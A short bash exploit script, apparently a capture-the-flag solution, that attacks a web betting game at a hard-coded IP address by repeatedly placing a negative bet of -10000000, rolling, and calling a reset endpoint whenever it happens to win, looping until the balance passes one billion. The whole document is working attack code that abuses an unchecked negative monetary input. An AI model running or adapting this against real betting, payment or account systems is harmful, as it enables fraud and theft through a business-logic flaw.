#!/bin/bash

TARGET_URL="http://13.53.139.118:63416"
TARGET_BALANCE=1000000000
BET_AMOUNT="-10000000" # bet (-)
BET_ON="0"

echo "Starting exploit... Target: $TARGET_BALANCE$"

get_balance() {
    curl -s "$TARGET_URL/balance" | tr -d '$\n,'
}

current_balance=$(get_balance)
echo "Initial balance: $current_balance$"

while [ "$current_balance" -lt "$TARGET_BALANCE" ]; do
    echo "------------------------------------"

    echo "Setting bet: $BET_AMOUNT$ on $BET_ON"
    curl -s -X POST "$TARGET_URL/bet" -d "betAmount=$BET_AMOUNT" -d "bet=$BET_ON" > /dev/null

    # --- Шаг 2: Сделать бросок ---
    echo "Rolling..."
    roll_result=$(curl -s "$TARGET_URL/roll")

    echo "Server response: $roll_result"
    if echo "$roll_result" | grep -q "You won! :)"; then
        echo "!!! OOPS! Unlucky roll. Resetting balance to 100$."
        curl -s "$TARGET_URL/reset" > /dev/null
    fi
    current_balance=$(get_balance)
    echo "New balance: $current_balance$"

    sleep 0.1
done

echo "------------------------------------"
echo "Mission accomplished! 🏆"
echo "Final Balance: $current_balance$"